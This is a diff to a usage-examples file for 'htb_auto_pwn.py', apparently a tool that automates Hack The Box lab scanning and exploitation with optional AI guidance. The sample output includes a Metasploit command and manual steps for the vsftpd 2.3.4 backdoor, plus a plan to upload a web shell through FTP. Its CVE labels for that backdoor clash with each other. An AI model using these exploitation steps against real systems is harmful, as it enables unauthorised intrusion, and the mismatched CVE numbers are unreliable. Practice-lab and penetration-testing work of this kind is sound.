@@ -80,6 +80,139 @@ FLAGS DISCOVERED:
   ✓ 5f4dcc3b5aa765d61d8327deb882cf99 (from FTP)
 ```
 
+## Example 1.5: AI-Powered Scan
+
+### Command
+```bash
+export OPENAI_API_KEY='sk-...'
+python3 htb_auto_pwn.py -t 10.10.10.3 --ai -v
+```
+
+### AI-Enhanced Output
+```
+╔══════════════════════════════════════════════╗
+║   HTB Automated Flag Reveal System          ║
+║   Target: 10.10.10.3                        ║
+╚══════════════════════════════════════════════╝
+
+[INFO] AI-powered analysis enabled
+
+[PHASE 1] Network Scanning
+[INFO] Starting quick port scan on 10.10.10.3
+[INFO] Open ports found: [21, 22, 80]
+[INFO] Running detailed scan on ports: 21,22,80
+[INFO] [Progress] Detailed scan completed successfully
+
+[PHASE 1.5] AI-Powered Analysis
+[INFO] 🤖 AI analyzing scan results...
+[INFO] ✓ AI analysis complete
+[INFO] Strategy: targeted
+[INFO] Reasoning: FTP anonymous access is most promising, followed by web enumeration
+
+[INFO] 🎯 Performing AI-guided targeted scans...
+[INFO] Priority ports: 21, 80
+[INFO] Identified attack vectors:
+  • Anonymous FTP access for file enumeration
+  • Web server directory bruteforcing
+  • Potential for credential harvesting
+
+[INFO] Running targeted scan on port 21...
+[INFO] AI Recommendation: Check for writable directories and hidden files in FTP
+[INFO] Running scripts: ftp-anon,ftp-bounce
+[INFO] ✓ Targeted scan completed for port 21
+
+[INFO] Running targeted scan on port 80...
+[INFO] AI Recommendation: Enumerate web directories and check for admin panels
+[INFO] Running scripts: http-enum,http-headers,http-methods,http-robots.txt
+[INFO] ✓ Targeted scan completed for port 80
+
+[PHASE 2] Vulnerability Detection
+[INFO] Analyzing for vulnerabilities...
+[INFO] Found 3 potential vulnerabilities
+  - ftp_anonymous on port 21 (Severity: high)
+  - ssh on port 22 (Severity: medium)
+  - web on port 80 (Severity: medium)
+
+[INFO] AI-identified potential vulnerabilities:
+  • CVE-2015-3306 (vsftpd 2.3.4 backdoor)
+  • Anonymous FTP write access
+  • Outdated Apache version with known exploits
+
+[PHASE 2.5] AI Exploit Analysis
+[INFO] Getting exploit suggestions for 3 vulnerabilities...
+
+============================================================
+AI PROMPT - Exploit Suggestions for ftp_anonymous
+============================================================
+You are an expert penetration tester. Suggest specific exploits...
+[Full prompt displayed here]
+============================================================
+
+============================================================
+AI RESPONSE - Exploit Suggestions
+============================================================
+{
+  "exploits": [
+    {
+      "name": "vsftpd 2.3.4 Backdoor Command Execution",
+      "type": "metasploit",
+      "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
+      "cve": "CVE-2011-2523",
+      "success_probability": "high",
+      "description": "Backdoor in vsftpd 2.3.4 allows command execution"
+    }
+  ],
+  "tools": ["metasploit", "nmap", "lftp"],
+  ...
+}
+============================================================
+
+💥 Exploit Suggestions for ftp_anonymous (Port 21):
+
+[Exploit 1] vsftpd 2.3.4 Backdoor Command Execution
+  Type: metasploit
+  CVE: CVE-2011-2523
+  Success Probability: HIGH
+  Description: Backdoor in vsftpd 2.3.4 allows command execution
+  Command: use exploit/unix/ftp/vsftpd_234_backdoor
+
+Manual Exploitation Steps:
+  1. Connect to FTP with username ending in :)
+  2. Backdoor opens on port 6200
+  3. Connect to port 6200 for shell access
+
+Recommended Tools:
+  • metasploit
+  • nmap
+  • lftp
+
+⚠️  Cautions:
+  • Backdoor may be patched in some versions
+  • Test in controlled environment first
+
+References:
+  • https://www.exploit-db.com/exploits/17491
+  • https://github.com/rapid7/metasploit-framework
+
+[PHASE 3] Exploitation
+[INFO] 🎯 AI-recommended exploitation order:
+  1. Exploit FTP anonymous access first
+  2. Upload web shell through FTP if writable
+  3. Enumerate web directories for sensitive files
+
+[INFO] Starting exploitation phase...
+[INFO] [FLAG FOUND] FTP: 5f4dcc3b5aa765d61d8327deb882cf99
+
+FLAGS DISCOVERED:
+  ✓ 5f4dcc3b5aa765d61d8327deb882cf99 (from FTP)
+```
+
+### AI Benefits in This Example
+- Identified vsftpd backdoor vulnerability specifically
+- Prioritized FTP over other services
+- Suggested multi-stage attack (FTP → web shell)
+- Ran targeted scripts based on service analysis
+
 ## Example 2: Verbose Mode
 
 ### Command
@@ -206,6 +339,27 @@ flag{password123}
 
 ## Troubleshooting Examples
 
+### Scan Timeout with Progress Updates
+```bash
+$ python3 htb_auto_pwn.py -t 10.10.11.86
+
+[INFO] Starting quick port scan on 10.10.11.86
+[INFO] Scanning top 100 ports (this may take 1-2 minutes)...
+[INFO] Open ports found: [22, 80]
+[INFO] Running detailed scan on ports: 22,80
+[INFO] Progress: Service detection, OS fingerprinting, and vulnerability scripts
+[INFO] This scan may take 5-10 minutes depending on target responsiveness...
+[INFO] [Progress] Running nmap with service detection and scripts...
+[ERROR] Detailed scan timed out after 15 minutes
+[WARNING] Attempting to parse partial results...
+[INFO] Partial scan results found, parsing available data...
+```
+
+The script will automatically:
+- Show progress updates during long scans
+- Attempt to parse partial results if timeout occurs
+- Provide actionable suggestions for resolution
+
 ### No Flags Found
 ```bash
 # Check the JSON output for clues
@@ -215,17 +369,30 @@ cat htb_results_*.json | jq '.vulnerabilities'
 cat htb_auto_*.log | grep -i "flag\|error\|vulnerable"
 ```
 
-### Timeout Issues
+### Network Connectivity Issues
 ```bash
-# Run with increased timeout (edit script):
-# quick_scan_timeout = 600
-# detailed_scan_timeout = 1200
-python3 htb_auto_pwn.py -t 10.10.10.100
+$ python3 htb_auto_pwn.py -t 10.10.10.100
+
+[ERROR] Quick scan timed out after 5 minutes
+[ERROR] Target 10.10.10.100 may be unreachable or heavily filtered
+[INFO] Try: ping 10.10.10.100 to verify connectivity
+
+# Verify connectivity first
+ping 10.10.10.100
+
+# If host appears down but you know it's up, try manual scan
+nmap -Pn 10.10.10.100
 ```
 
-### Permission Denied
+### Permission Denied Errors
 ```bash
-# Run with sudo for raw socket access
+$ python3 htb_auto_pwn.py -t 10.10.10.100
+
+[ERROR] Detailed scan failed with error code 1
+[ERROR] Error details: permission denied
+[INFO] Try running with sudo: sudo python3 htb_auto_pwn.py -t 10.10.10.100
+
+# Run with elevated privileges
 sudo python3 htb_auto_pwn.py -t 10.10.10.100
 ```
 
